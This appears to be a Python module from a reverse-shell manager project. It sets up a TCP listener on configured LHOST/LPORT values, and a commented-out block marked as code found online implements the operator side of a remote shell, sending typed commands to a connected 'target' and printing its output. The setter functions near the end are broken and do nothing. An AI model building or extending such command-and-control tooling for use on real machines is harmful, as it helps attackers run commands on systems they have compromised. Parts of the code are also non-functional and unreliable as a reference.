import socket
import sys
import time
import reverse_shell_manager
import settings
import threading
import socketserver

def listen(ip, port):
    server = socketserver.TCPServer((ip, port), socketserver.BaseRequestHandler)
    print("Listening on", settings.LHOST, "on port", settings.LPORT)
    th = threading.Thread(target=server.serve_forever)
    th.daemon = True
    th.start()



'''

Code found online

def listen(ip,port):
    # Create listener
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

'''


def set_lhost(var, value):
    var = str(value)

def set_lport(var, value):
    var = int(value)

